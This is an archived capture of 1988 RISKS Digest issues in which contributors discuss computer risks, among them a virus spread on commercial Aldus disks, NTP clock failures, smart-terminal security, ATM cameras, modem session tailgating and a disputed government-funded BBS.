  of work.

  Until this incident, personal computer viruses were though to
  be hidden only on non-commercial software.  [...shareware and
  BBS's are explained, more stuff we know...]

  Computer experts had said viruses could be avoided if users didn't use
  freely distributed software and instead used only off-the-shelf programs.

  But the infection of the Aldus software shows that isn't the case.

  The virus was inadvertantly passed to Aldus by Marc Canter, president of
  MacroMind Inc. of Chicago, which makes training disks for Aldus.

[Canter's personal machine caught the virus from a copy of Mr.  Potato Head
and was later used to work on the training software for Aldus]

  Without either Canter or Aldus realizing it, the computer virus was copied
  onto disks that were sold to consumers. When the comnsumers used the disks
  their computers became infected.

  The virus is thought to be harmless now. It was designed to pop up on
  Macintosh screens on March 2, the anniversery of the introduction of the
  Apple Macintosh SE and Macintosh II.

  "The time bomb already went off" said Donn Parker, a computer security
  specialist as SRI in Menlo Park, Calif.

  All Aldus programs will be developed on "isolated computers" in the future
  to avoid the incident from recurring, an Aldus spokesman said.

  Canter fears that more of his customers may have been infected with the
  virus. MacroMind's clients include Microsoft, Lotus, Apple, and Ashton-Tate.
  [Microsoft says they know their software is safe, all others delined to
  comment].

Well I guess the virus program as a concept is here to stay, as software
becomes more complicated (gooey interfaces and the like) there are more and
more places to hide them. I wonder how long it will be before we see our first
OS/2 virus?

A potentially more important risk is the economic one to our industry.  What
will happen to the commercial software marketplace if more such incedents
occur? This article appeared prominently in the business section of the paper,
not buried in the weekly high hech feature article where previous virus stories
have run. Will such publicity sour investor and consumer confidence in specific
companies or the industry as a whole?

If a company spreads a damaging virus in commercial software are they liable
for the damages caused? Will they have to take out "software malpractice"
insurance?

Norman Soley, Data Communications Analyst, Ontario Ministry of the Environment
UUCP:	utzoo!lsuc!ncrcan!---\			VOICE:	+1 416 323 2623
	{utzoo,utgpu}!sickkids!ontenv!norm	ENVOY:	N.SOLEY
	{mnetor,utgpu}!ontmoh/

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
The trouble with "Experts"
</A>
</H3>
<address>
Ewan Tempero 
&lt;<A HREF="mailto:ewan@june.cs.washington.edu">
ewan@june.cs.washington.edu
</A>&gt;
</address>
<i>
Thu, 17 Mar 88 10:57:04 PST
</i><PRE>

The Seattle Times has a column called "Troubleshooter", which investigates
problems of various kinds that people might have. In yesterday's column
(Wednesday, March 16) there was a story about erroneous US Sprint telephone
bills. What caught my eye was the following paragraph:

    Well, according to U.S. Sprint Communications Co., "toll fraud,"
    or a computer virus caused by hackers, was responsible for errors 
    on the phone bill for &lt;the person with the problem&gt;.

What was interesting about this was that problems occurred in May 1986.  I
had no idea that the computer virus had been around that long nor that it
had already hit a major company so I talked to the person who wrote the
column to confirm this. The answer? "They said `toll fraud'.  Isn't that
what viruses are?"!

Here we have a column that is probably read by many people who did not read
the half page that the Seattle Times ran on computer viruses a month ago.
Now to those people "computer virus" means the same is "hacker". It used to
be that the average person on the street couldn't understand computers
because of all the jargon, now, everyone knows the jargon but have a
completely different interpretation of it due to these "experts" who really
don't know what they are talking about.
                                                  --ewan

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
Thoughts on viruses and trusted bulletin boards
</A>
</H3>
<address>
&lt;<A HREF="mailto:Richard_Wiggins@um.cc.umich.edu">
Richard_Wiggins@um.cc.umich.edu
</A>&gt;
</address>
<i>
Thu, 17 Mar 88 01:34:30 EST
</i><PRE>

Before the recent spate of viruses, the commonly accepted advice seemed to
be that if one is concerned about reliability of public domain software, one
should load from trusted sources and should only load items that the braver
have tested.

If the practice of spreading virsuses continues to be a problem, it seems to
me that a few measures on the part of bulletin board operators would greatly
reduce the risk.
 
To wit:
 
-- All providers of software must provide source code for each
   submission to the bulletin board operator.
 
-- The bulletin board operator will compile / assemble the
   provided source, and distribute only the resulting binary
   files.
 
-- The bulletin board operator will insist on a verifiable
   identification of the author of all submissions.  At a
   minimum, the operator will phone the author and speak
   to him or her over the supplied telephone number.
 
This scheme doesn't prevent viruses.  It makes it a lot easier
to identify what programs have viruses built in, and to track
down the author when a time bomb should go off.
 
Authors who don't want source distributed to the public could
so specify, but the operator would still insist on receiving
the source, compiling it, and archiving source while making
object available to users.
 
Naturally, this notion implies all sorts of costs for the bulletin
board operators.  Probably it would only be viable for larger
operations, perhaps commercial ones.  For instance, a small
bulletin board wouldn't be able to afford all the popular
compilers and assemblers required.
 
If we cannot devise a means whereby public domain software can
be trusted, it will disappear out of consumer fear.  One simply
cannot trust an executable file without knowing what the source
code does, or at least knowing one can go back and find out what
the source code did.

Richard Wiggins, Lead Systems Programmer, Michigan State Univ.  517-353-4955

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.45.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.47.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-82</DOCNO>
<DOCOLDNO>IA012-000129-B044-66</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.47.html 128.240.150.127 19970217020205 text/html 25548
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:00:34 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 47</TITLE>
<LINK REL="Prev" HREF="/Risks/6.46.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.48.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.46.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.48.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 47</H1>
<H2>  Monday 21 March 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
NTP Timewarp - the difficulties of synchronizing clocks 
</A>
<DD>
<A HREF="#subj1.1">
Jerry Leichter
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
   USA: Time for wrong time, again 
</A>
<DD>
<A HREF="#subj2.1">
Scot E. Wilcoxon
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
   Risks from smart terminals - and risks that aren't there 
</A>
<DD>
<A HREF="#subj3.1">
Jerry Leichter
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
   ATMs and Fear of Cameras 
</A>
<DD>
<A HREF="#subj4.1">
Jeff Stearns
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
   More Communications Insecurity 
</A>
<DD>
<A HREF="#subj5.1">
Dennis Hamilton
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
   What the computer says, goes - even if it is obviously wrong.     
</A>
<DD>
<A HREF="#subj6.1">
Michael Newbery
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
   Risks of automatic mailwatch reply programs 
</A>
<DD>
<A HREF="#subj7.1">
Martin Minow
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
   Census data availability 
</A>
<DD>
<A HREF="#subj8.1">
Joe Morris
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
   Cyber Foundation BBS 
</A>
<DD>
<A HREF="#subj9.1">
James Jones via Martin Minow
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
"NTP Timewarp - the difficulties of synchronizing clocks" 
</A>
</H3>
<address>
"Jerry Leichter (LEICHTER-JERRY@CS.YALE.EDU)"
&lt;<A HREF="mailto:LEICHTER@Venus.YCC.Yale.Edu">
LEICHTER@Venus.YCC.Yale.Edu
</A>&gt;
</address>
<i>
Mon, 21 Mar 88 11:37 EST
</i><PRE>

The following message was posted to the tcp-ip newsgroup by Mills@UDEL.EDU.

	Folks,

	At the moment both the ISI and NCAR radio clocks have failed, while
	the UDel radio clock is down for repair. This leaves only the UMd and
	Ford radio clocks online. Unfortunately, sometime since Friday evening
	the NTP primary time-server network, which usually thrives when one or
	more radio clocks fail, went nuts and may have delivered bogus time. I
	believe I have found and fixed the bug, which turned out to be subtle
	indeed and bit only in an interesting and unusual scenario involving
	broken spanning trees. As of now (Saturday afternoon) all primary
	servers ISI, NCAR, UDel, UMd, Ford and DECWRL have been fixed. Note
	that all except UMd and Ford are running at stratum two, since they
	have automatically resynchronized to the remaining radio clocks.
	Secondary servers at Linkabit and Rice, now operating at their usual
	stratum two, have also been fixed.

	There is at least one Unix site that crashed due the broken time.
	Since the bug was due to my own error and not due to the protocol
	design or Mike Petry's NTP daemon, I do apologize for any
	inconvenience. When a new NTP daemon conforming to the latest protocol
	revision becomes available, even this latest bug will not cause
	timewarps, should something like it ever happen again.

	Dave

I don't know anything about the details of the system involved, but it's
nevertheless interesting to compare the description with some of the scenarios
Perrow describes in "Necessary Risks".  Here we have an apparently highly
redundant system (6 primary servers).  However, we find a time when two
have failed, just as a third goes down for repair.  (The numbers don't add up
- DECWRL is unaccounted for.  Perhaps its network connection failed.)  At just
that time, a bug is triggered by yet another unusual confluence of events that
leaves the network in a particular state.
							-- Jerry

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
USA: Time for wrong time, again
</A>
</H3>
<address>
Scot E. Wilcoxon
&lt;<A HREF="mailto:sewilco@datapg.mn.org ">
sewilco@datapg.mn.org 
</A>&gt;
</address>
<i>
Sun, 20 Mar 88 23:02:54 CST
</i><PRE>

A few types of computers had problems with 1988 or leap year.  Next,
many USA computer sites get to encounter Daylight Savings time.

This year Daylight Savings time begins on April 3, three weeks earlier than
it formerly began.  Computers which automatically calculate DST may have
outdated programming.  Most systems will not actually malfunction, but users
of the machines will not consider the old time as being correct.

Systems with time-sensitive interactions with other systems might have 
problems.  Perhaps we'll find out if they're not corrected in time.

Scot E. Wilcoxon, Data Progress   {amdahl|hpda}!bungia!datapg!sewilco
+1 612-825-2607
                                                       [Pun unintended?  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Risks from smart terminals - and risks that aren't there
</A>
</H3>
<address>
LEICHTER-JERRY@CS.YALE.EDU
&lt;<A HREF="mailto:"Jerry Leichter ">
"Jerry Leichter 
</A>&gt;
</address>
<i>
Fri, 18 Mar 88 13:01 EST
</i><PRE>

The recent discussion of the various risks posed by smart terminals has in-
evitably lead to a comment (Jim Frost's) about VT220's.  Actually, VT220's
and related terminals are examples of the RIGHT way to design smart terminals
for a hostile environment:

	a)  It is indeed possible to send a request to a VT220 and have it
		reply with its programmed answerback sequence - which could
		be anything at all.  However, the answerback sequence cannot
		be changed by anything the host sends - the only way to get
		write access to it is from local setup mode.

		BTW, this should again emphasize that if you don't have
		adequate physical control over your equipment, all bets are
		off.

	b)  It is possible to program some of the keys on a VT220 and have
		it send anything you like when that key is struck.  Unlike
		the answerback sequence, key definitions CAN be changed from
		the host.  However, it's possible to lock the key definitions.
		Once they are locked, nothing the host does can unlock them;
		the lock bit can only be cleared locally, from setup mode.

		I should also point out that the programmable keys are all
		inactive until you load something into them - it's not
		possible to change, say, RETURN to "DELETE".  This makes it
		unlikely that you can catch someone who never loads the
		programmable keys, and hence leaves them unlocked.

	c)  It's possible to lock the keyboard from the host, but it's also
		always possible to go into setup and unlock it.  In addition,
		a user can locally "lock user preference features", which
		disables the host's ability to modify some terminal para-
		meters.  "Keyboard Action", which is the parameter that con-
		trols whether the keyboard is locked or not, is a user pre-
		ference feature.

There may be ways to "hack" a VT220 - actually, there are probably more ways
with its graphics cousin, the VT240.  My point here is not that there are NO
risks with a VT220; it's that it IS possible to design a smart terminal that
does a pretty good job of avoiding most of them.  Just because some terminal
interfaces are poorly thought out doesn't mean that it's impossible to design
good ones.
							-- Jerry

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
ATMs and Fear of Cameras (Re: <A HREF="/Risks/6.41.html">RISKS-6.41</A>)
</A>
</H3>
<address>
Jeff Stearns
&lt;<A HREF="mailto:jeff@tc.fluke.com ">
jeff@tc.fluke.com 
</A>&gt;
</address>
<i>
Thu, 17 Mar 88 11:15:05 PST
</i><PRE>
Organization: John Fluke Mfg. Co., Inc., Everett, WA

ATMs aren't protected by cameras.  They're protected by the *fear* of cameras.

Banks rely on that fear.  But that's risky for them, too.

I always treated cash machines with reasonable respect until I once had to
amuse myself while waiting for the machine to complete a particularly
sluggish transaction.  Growing tired of mugging for the camera, I paused to
inspect it more closely.

The camera was mounted behind a semi-silvered mirror (but we fans of "one
way" mirrors always regard them as more of a challenge than deterrent).  By
assuming a proper viewing position about two inches from the mirror, I could
closely study the camera and lens.

The big juicy lens was clearly visible and boldly emblazoned with the single
word "Polaroid".  The only other distinguishing mark was the corner of a
fragment of sticky foam tape which affixed the lens to the "camera body".

From that moment onward, the camera and I became fast friends.  I took
particular pleasure in asking the bank tellers about its health.  In fact,
I believe that I was first to alert them when the adhesive dried out and
the lens fell off.

Next time you do business with Capital Savings, be sure to smile for the
camera.  Now I've begun to wonder about the cameras mounted *inside* the bank.

Jeff Stearns 	John Fluke Mfg. Co, Inc.   (206) 356-5064

    "Oh, no sir, the cash machine only gave me $20 instead of $40.  Just
     check your camera records; you'll clearly see that only $20 came out."

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
More Communications Insecurity
</A>
</H3>
<address>
Dennis Hamilton
&lt;<A HREF="mailto:rochester!cci632!sjfc!deh0654@rutgers.edu ">
rochester!cci632!sjfc!deh0654@rutgers.edu 
</A>&gt;
</address>
<i>
Thu, 17 Mar 88 17:11:41 EST
</i><PRE>

%A Alan Baley
%T Tailgating: A dirty little network security problem
%J Data Communications
%V 17
%N 3
%D March, 1988
%P 55-58
%O Newsfront Section
%K Open Connections Unrecognized Disconnects Concentrators Gateways
%X This article basically confirms that tailgating is still a regular
problem on VANs, private networks, and, of course, your friendly
neighborhood university dial-up system.
  Tailgating refers to the situation where a concentrator or other
front-end equipment fails to noticed a dropped call, allowing a new
call to seize that slot and operate in continuation of the previous
user's session.  The article describes how many occurences are a result
of careless strapping and configuration of modems and concentrators,
but that systems remain vulnerable to the problem, especially when
they are overloaded.  (When I tried my hand at PC bulletin-board
software, this is one of the things that I was proud of getting
right.  It is very important to *never* let a modem answer on its
own, getting the computer to notice and handle the new ring instead.
However, many larger systems are not able to operate that way and must
use auto-answer modems.  It is very easy for a disconnect and new
call to go unnoticed under those conditions, leaving the previous
caller's accounts and data open to intrusion.  It shouldn't be allowed.)
  [Dennis E. Hamilton: 88-03-17]

%T NASA Encounters a Trojan Horse
%J Data Communications
%V 17
%N 3
%D March, 1988
%P 83
%O Advertisement
%K Digital Pathways West German hackers NASA X.25 intrusion
%X This advertisement is for a family of dial-up security products.
It claims that the West German hackers who broke into the NASA X.25
(SPAN?) network did so via a Trojan horse and were able to operate
unnoticed for three months.
  The ad suggests that NASA had comprehensive security measures
and they were vulnerable anyhow.
  It is not at all clear to me how network security at access
points is any use at all against a Trojan horse, so there seems to
be some hyperbole here.  It makes for a nice advertisement
illustration, though, with a Trojan Horse on the moon in the
background behind a LEM labelled X.25!  On the other hand, if this
is the level of sophistication of the advertiser, would you
let them do your network security?
  Digital Pathways, Inc., 201 Ravendale Drive, Mountain View CA 94043.
  [Dennis E. Hamilton: 88-03-17]
	-- orcmid {uucp: ... !rochester!sjfc!deh0654 ...

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
What the computer says, goes - even if it is obviously wrong.
</A>
</H3>
<address>
Michael Newbery
&lt;<A HREF="mailto:newbery@comp.vuw.ac.nz ">
newbery@comp.vuw.ac.nz 
</A>&gt;
</address>
<i>
20 Mar 88 21:20:35 GMT
</i><PRE>
Organization: Computing Serv. Ctr, Victoria Uni., Wellington, New Zealand

Another example of "If the computer says it is so, it must be so!"

From the Wellington 'Evening Post', Saturday 19 March 1988, By Karina Barrymore
Reprinted WITHOUT permission

Discovery yesterday of a computer error which overcharged interest on some
credit cards may have never come to light except for persistent inquiries by
a cardholder.  An article in the Post last night said Charge Card
Corpororation, the manager of 20 retail outlet credit cards [in NZ] had been
overcharging interest.  After a two week inquiry, [the] managing director
finally told the cardholder a mistake had been made-the computer program
that calculated the interest was wrong.  The company has said it will
correct the error and refund all overcharging.

However, the company's attempted fob-off and run-around given to this
reporter, who is also the cardholder concerned, is a story on its own.  My
latest statement showed interest of $9.97 on an opening balance of $111.49
debt.  The statement clearly said monthly interest was calculated at 2.46% a
month.  Out came the calculator and the card's conditions of use and what
resulted was total confusion. It just didn't add up.

The next day I rang the co. and spoke to [someone] in the cardholder
services dept [who sent a letter] detailing account transactions and the
formula for interest calculations. Again the calculator and again it just
didn't add up.  I rang again and was told I probably didn't understand such
a complicated matter and was assured it was right. I responded that I did
understand but did not agree with the amount of interest. [The services
rep.]  finally offered to personally go through the statement and manually
calculate the interest, adding: "When we do that we always come up with
something different to what the computer tells us."

Why was that?

"I don't know, it always happens. I think it's something to do with the way
it's programmed."

[On hearing this the reporter asked to speak with the manager and was refused.
After much obstruction she finally reached him.]

He was aware of my inquiry and said the accounts department had credited
$5.97 against the interest of $9.97. There appeared to have been an error, he
said. He would not say what caused the error. When I repeated the comments
made about the computer program he said he would look into it and give me an
answer as soon as possible.

Several days and many unanswered messages later I rang the manager again.
He had not looked into the problem any further. He thought I would forget
about it, he said.  He also said he could, if he wanted, redebit the $5.97
credit to my account.  On being asked why he would do this he said according
to the computer that was the correct amount.

I repeated my request for the matter to be investigated.

Two days later he phoned and said there was an error in the computer
program.  Interest had been charged incorrectly.  "There has been a mistake,
an unintentional mistake. We will take immediate steps to rectify the
situation." he said.

Michael Newbery

Internet: newbery@comp.vuw.ac.nz

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Risks of automatic mailwatch reply programs
</A>
</H3>
<address>
&lt;<A HREF="mailto:minow%thundr.DEC@decwrl.dec.com ">
minow%thundr.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
21 Mar 88 12:37
</i><PRE>

While I was on vacation last week, broiling under the mind-numbing sun of
Southern California and longing for the cool breezes of a late New England
winter, I left a "mail watch" program running on my office system.  When
mail arrived, it formatted a "I'll be out until Monday" response and sent it
back to the responder.

A few risks -- some humorous, some not:

1. although the program is supposed to send only one response to an individual,
   it assumes that all name/node strings are different.  This means that a
   few people who send mailing lists from different machines or via different
   network paths got extra responses.  They were not always amused.

2. Within my company, many Usenet news groups are distributed by a mailer.
   This means that I receive a few daily messages from "NODE::USENET".
   My watcher dutifully replied.  This triggered a mail watcher on
   NODE::USENET which patiently explained to my mail watcher how to
   subscribe to the service.  Fortunately, the history file prevented
   this from escalating to a fullscale network war.

3. I received a query from someone wondering why my mail watcher sent
   him a reply.  It turned out that he had taken some software from
   an internal library/archive system that mails me a registration
   notice (good for monitoring bugs and waving at my boss at salary
   review time).

4. Ken Laws (who distributes the AI-digest) was kind enough to note a
   more serious risk of such programs:  by broadcasting a message that
   says "I'm out of town until March 20th" to anyone who sends me mail,
   it's easy for a thief to schedule my house for burglary.  Ken noted
   that one of the lists that discusses stereo equipment experienced
   some trouble along that line.
                                               Martin

        [Same thing goes for FINGER/PLAN/... data.  PGN]

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Census data availability
</A>
</H3>
<address>
jcmorris@mitre.arpa
&lt;<A HREF="mailto:Joe Morris ">
Joe Morris 
</A>&gt;
</address>
<i>
Mon, 21 Mar 88 09:13:40 EST
</i><PRE>
Organization: The MITRE Corp., Washington, D.C.

The recent postings concerning the integrity of the Federal Archives reminds
me of a report I saw a couple of years ago which claimed that there are
only two computers in existence which can read the 1960 Federal Census master
data tapes.  One is in Japan, and the other is in the Smithsonian's collection.
I don't know for sure, but I think that the machine used was a UNIVAC II,
which would be consistent with the absence of any UniServo-compatible drives
for current machines.

The point being made in the article (in Spectrum, I think) was that using
new technology is often desirable (or even necessary), but that a blind
reliance on that technology may leave you with unusable files if the
technology to use them becomes obsolete.

How many RISKS-readers work in shops which have long since removed the last
7-track tape drive?  OK, how many of you with hands up still have some users'
tapes in your library which were recorded on a 7-track drive?  How about
historical usage data tapes for the computer center itself?  (*blush*)

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
I really don't believe this one -- Cyber Foundation BBS [jejones]
</A>
</H3>
<address>
&lt;<A HREF="mailto:minow%thundr.DEC@decwrl.dec.com">
minow%thundr.DEC@decwrl.dec.com
</A>&gt;
</address>
<i>
20 Mar 88 19:40
</i><PRE>

from
TELECOM Digest                         Thursday, March 17, 1988 9:56PM
Volume 8, Issue 52

From: &lt;atari!sun!mcrware!jejones@ames.arc.nasa.gov&gt;
Subject: Cyber Foundation BBS
Date: 16 Mar 88 23:08:53 CST (Wed)
 
I've just read something in the "Computer Communications" column of the April
1988 *Computer Shopper* that I find HIGHLY disturbing and which I think should
be brought to the attention of modem users.  I quote the salient portion:
 
"In a recent issue of *Info-Mat* magazine, an online 'magazine' available on
170 selected BBSs across the country, it was reported that the feds have
underwritten a BBS to monitor the BBS user community, with an eye toward
taxation and regulation.  The Cyber Foundation BBS describes itself and its
system in a text file as 'a non-profit government-supported system run by
the United States Instructional Department. [has anyone ever heard of this
alleged organization?]  This system is a test for the government and FCC to
determine if bulletin board systems, non-paying information exchange systems,
should be charged for use.'
 
"The sysop of the Cyber Foundation BBS is Chris Regan, who has left messages
to the effect that he does not work for the government, but that the govern-
ment has paid for (part of?) the equipment and operating costs.  An elaboration
of the system's purpose as stated by sysop Regan in some online messages is,
'a test to see if bulletin boards, their phone lines, and others, should be
taxed or have a tariff placed on the information.'
 
"Other regulatory ideas discussed on the BBS by the sysop have included the
licensing of modems (similar to ham radio), and the licensing of BBSs, inclu-
ding the segregation of BBSs by computer type, and foregoing any semblance of
BBS privacy by giving a government official the right to log on and 'inspect'
all messages and files at random times.
 
"There is little justification for regulating computer communication via
telephone.  As a licensed ham radio operator, I understand the reasons why
transmission of voice or data over the radio spectrum are regulated, but none
of these reasons are applicable concerning telephone usage.  When I make a
call on my telephone, whether I communicate by voice or computer, it is a
private matter between the party I am calling and me.  The government has no
more business pursuing private messages I have left on a BBS than they do
voice messages I leave on a friend's answering machine.  The FCC has spent
the last several years reducing regulation on the radio services; there is
absolutely no reason for them to set up a whole new area of regulation in
the telephone service.
 
"These ideas for bureaucratic power grabbing, invasion of privacy, limitation
of free speech and government money grubbing need to be refuted before they
advance any further.  The Cyber Foundation BBS is located somewhere in
Connecticut and the phone number is (203) 264-5463.  I encourage you to
call it up and let your opinions be known (courteously, of course)."
 
[end quote]

I have called the phone number, and found a BBS that does indeed go by that
name, with the stated Chris Regan as sysop.  Those messages I looked at didn't
seem to discuss the issues mentioned in the *CS* article; however, any threat
to the Constitution merits investigation.  (I left a message with the sysop
expressing my concern.)  Does anyone out there know anything about this BBS?
Are the cited issues really under discussion there?  Thanks...
                                                    		  James Jones
 
</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.46.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.48.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-83</DOCNO>
<DOCOLDNO>IA012-000129-B044-87</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.48.html 128.240.150.127 19970217020218 text/html 21690
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:00:45 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 48</TITLE>
<LINK REL="Prev" HREF="/Risks/6.47.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.49.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.47.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.49.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 48</H1>
<H2>  Wednesday 23 March 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Verified microprocessor for critical applications 
</A>
<DD>
<A HREF="#subj1.1">
Jon Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Computer rolls give indigestion to voters? 
</A>
<DD>
<A HREF="#subj2.1">
Dave Horsfall
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Re: "NEW" Amiga virus has arrived in Europe 
</A>
<DD>
<A HREF="#subj3.1">
Harv Laser
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  "Drive by wire" autos in development 
</A>
<DD>
<A HREF="#subj4.1">
Jonathan Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  The COMMON Code Virus  
</A>
<DD>
<A HREF="#subj5.1">
